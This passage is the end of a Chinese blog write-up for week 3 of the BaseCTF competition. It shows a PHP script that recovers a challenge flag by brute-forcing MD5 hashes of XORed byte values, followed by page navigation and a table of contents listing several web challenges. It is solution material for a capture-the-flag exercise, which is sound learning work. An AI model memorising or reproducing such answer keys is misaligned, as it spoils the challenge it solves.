class="string">"14bfa6bb14875e45bba028a21ed38046"</span>,</span><br><span class="line">    <span class="string">"fc490ca45c00b1249bbe3554a4fdf6fb"</span>, <span class="string">"37693cfc748049e45d87b8c7d8b9aacd"</span>,</span><br><span class="line">    <span class="string">"37693cfc748049e45d87b8c7d8b9aacd"</span>, <span class="string">"98f13708210194c475687be6106a3b84"</span>,</span><br><span class="line">    <span class="string">"3c59dc048e8850243be8079a5c74d079"</span>, <span class="string">"fc490ca45c00b1249bbe3554a4fdf6fb"</span>,</span><br><span class="line">    <span class="string">"33e75ff09dd601bbe69f351039152189"</span>, <span class="string">"4e732ced3463d06de0ca9a15b6153677"</span>,</span><br><span class="line">    <span class="string">"33e75ff09dd601bbe69f351039152189"</span>, <span class="string">"c16a5320fa475530d9583c34fd356ef5"</span>,</span><br><span class="line">    <span class="string">"43ec517d68b6edd3015b3edc9a11367b"</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于存储还原出的字符</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举法还原flag字符</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$json_data</span>); <span class="variable">$i</span>++){</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">256</span>; <span class="variable">$j</span>++){</span><br><span class="line">        <span class="variable">$xor_result</span> = <span class="variable">$j</span> ^ <span class="variable">$i</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$xor_result</span>) == <span class="variable">$json_data</span>[<span class="variable">$i</span>]){</span><br><span class="line">            <span class="variable">$flag</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>BaseCTF wp(week3)</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="http://example.com/2024/09/11/BaseCTF-week3/">http://example.com/2024/09/11/BaseCTF-week3/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>sh1ro</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-09-11</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-09-11</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BaseCTF/">BaseCTF</a></div><div class="post_share"><div class="social-share" data-image="/img/92298341_p0.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/09/11/BaseCTF-week2/" title="BaseCTF wp(week2)"><img class="cover" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/99737800_p0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BaseCTF wp(week2)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/11/BaseCTF-week2/" title="BaseCTF wp(week2)"><img class="cover" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/99737800_p0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-11</div><div class="title">BaseCTF wp(week2)</div></div></a></div><div><a href="/2024/09/04/BaseCTF_week1/" title="BaseCTF wp(week1)"><img class="cover" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/100377150_p0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-04</div><div class="title">BaseCTF wp(week1)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">sh1ro</div><div class="author-info__description">IMPOSSIBLE IS NOTHING</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/sh1sh1roro" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/1452471402@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: ;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BaseCTF-wp-week3"><span class="toc-number">1.</span> <span class="toc-text">BaseCTF wp(week3)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">1.1.1.</span> <span class="toc-text">复读机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C"><span class="toc-number">1.1.2.</span> <span class="toc-text">滤个不停</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-php-jail"><span class="toc-number">1.1.3.</span> <span class="toc-text">ez_php_jail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%A9%E5%8E%9F%E7%A5%9E%E7%8E%A9%E7%9A%84"><span class="toc-number">1.1.4.</span> <span class="toc-text">玩原神玩的</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/11/BaseCTF-week3/" title="BaseCTF wp(week3)"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/92298341_p0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BaseCTF wp(week3)"></a><div class="content"><a class="title" href="/2024/09/11/BaseCTF-week3/" title="BaseCTF wp(week3)">BaseCTF wp(week3)</a><time datetime="2024-09-11T05:30:15.000Z" title="发表于 2024-09-11 13:30:15">2024-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/11/BaseCTF-week2/" title="BaseCTF wp(week2)"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/99737800_p0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BaseCTF wp(week2)"></a><div class="content"><a class="title" href="/2024/09/11/BaseCTF-week2/" title="BaseCTF wp(week2)">BaseCTF wp(week2)</a><time datetime="2024-09-11T03:00:10.000Z" title="发表于 2024-09-11 11:00:10">2024-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/04/BaseCTF_week1/" title="BaseCTF wp(week1)"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/100377150_p0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BaseCTF wp(week1)"></a><div class="content"><a class="title" href="/2024/09/04/BaseCTF_week1/" title="BaseCTF wp(week1)">BaseCTF wp(week1)</a><time datetime="2024-09-04T12:21:21.000Z" title="发表于 2024-09-04 20:21:21">2024-09-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/18/SRCTF/" title="SRCTF wp"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/category_img.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SRCTF wp"></a><div class="content"><a class="title" href="/2024/08/18/SRCTF/" title="SRCTF wp">SRCTF wp</a><time datetime="2024-08-18T12:23:17.000Z" title="发表于 2024-08-18 20:23:17">2024-08-18</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By sh1ro</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><div id="runtime"></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/runtime.js"></script><script src="/js/title.js"></script><script defer="" src="/live2d-widget/autoload.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>